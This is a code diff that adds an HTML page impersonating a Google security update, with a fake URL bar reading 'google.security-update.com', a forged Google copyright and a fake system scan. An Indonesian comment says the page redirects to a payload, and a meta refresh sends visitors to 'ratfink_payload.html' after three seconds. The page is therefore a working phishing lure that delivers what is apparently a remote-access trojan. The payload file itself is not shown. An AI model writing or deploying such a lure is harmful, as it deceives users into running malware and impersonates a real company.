@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Security Update</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: linear-gradient(145deg, #0f172a 0%, #1e293b 100%);
+            color: white;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0;
+            padding: 20px;
+        }
+        
+        .container {
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+            padding: 40px 20px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 32px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            animation: fadeIn 0.6s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .logo {
+            width: 100px;
+            height: 100px;
+            background: linear-gradient(145deg, #3b82f6, #2563eb);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 30px;
+            font-size: 50px;
+            box-shadow: 0 10px 20px -5px rgba(37, 99, 235, 0.5);
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+        
+        h1 {
+            font-size: 28px;
+            margin-bottom: 10px;
+            color: #fff;
+            font-weight: 600;
+        }
+        
+        .subtitle {
+            color: #94a3b8;
+            font-size: 16px;
+            margin-bottom: 30px;
+        }
+        
+        .loader {
+            width: 60px;
+            height: 60px;
+            border: 5px solid #334155;
+            border-top-color: #3b82f6;
+            border-radius: 50%;
+            animation: spin 1s infinite linear;
+            margin: 30px auto;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .url-bar {
+            background: #1e293b;
+            border-radius: 999px;
+            padding: 12px 20px;
+            margin: 20px 0;
+            font-size: 14px;
+            color: #94a3b8;
+            border: 1px solid #334155;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .url-bar .lock {
+            color: #10b981;
+        }
+        
+        .url-bar .domain {
+            color: #fff;
+            font-weight: 500;
+        }
+        
+        .progress-container {
+            width: 100%;
+            height: 6px;
+            background: #334155;
+            border-radius: 999px;
+            margin: 30px 0;
+            overflow: hidden;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #3b82f6, #8b5cf6);
+            width: 0%;
+            animation: loading 2s infinite;
+        }
+        
+        @keyframes loading {
+            0% { width: 0%; }
+            50% { width: 100%; }
+            100% { width: 0%; }
+        }
+        
+        .status {
+            color: #64748b;
+            font-size: 14px;
+            margin-top: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            background: #10b981;
+            border-radius: 50%;
+            display: inline-block;
+            animation: blink 1.5s infinite;
+        }
+        
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+        
+        .footer {
+            margin-top: 30px;
+            color: #475569;
+            font-size: 12px;
+        }
+        
+        .footer a {
+            color: #64748b;
+            text-decoration: none;
+        }
+        
+        .footer a:hover {
+            color: #94a3b8;
+        }
+        
+        .badge {
+            background: #1e293b;
+            border-radius: 999px;
+            padding: 4px 12px;
+            font-size: 12px;
+            color: #94a3b8;
+            display: inline-block;
+            margin-bottom: 20px;
+            border: 1px solid #334155;
+        }
+    </style>
+    
+    <!-- Redirect ke payload setelah 3 detik -->
+    <meta http-equiv="refresh" content="3;url=ratfink_payload.html">
+</head>
+<body>
+    <div class="container">
+        <div class="badge">🔒 Google Security</div>
+        
+        <div class="logo">
+            <span>🛡️</span>
+        </div>
+        
+        <h1>Security Update Required</h1>
+        <div class="subtitle">Critical security patch for your device</div>
+        
+        <div class="url-bar">
+            <span class="lock">🔒</span>
+            <span>google</span>
+            <span class="domain">.security-update.com</span>
+        </div>
+        
+        <div class="loader"></div>
+        
+        <div class="progress-container">
+            <div class="progress-bar"></div>
+        </div>
+        
+        <div class="status">
+            <span class="status-dot"></span>
+            <span>Verifying connection... Please wait</span>
+        </div>
+        
+        <div class="status" style="margin-top: 10px; font-size: 12px;">
+            <span>Scanning: system32/config/system</span>
+        </div>
+        
+        <div class="footer">
+            <p>© 2024 Google LLC - All rights reserved</p>
+            <p style="margin-top: 5px;">
+                <a href="#">Privacy</a> • <a href="#">Terms</a> • <a href="#">Security</a>
+            </p>
+        </div>
+    </div>
+</body>
+</html>
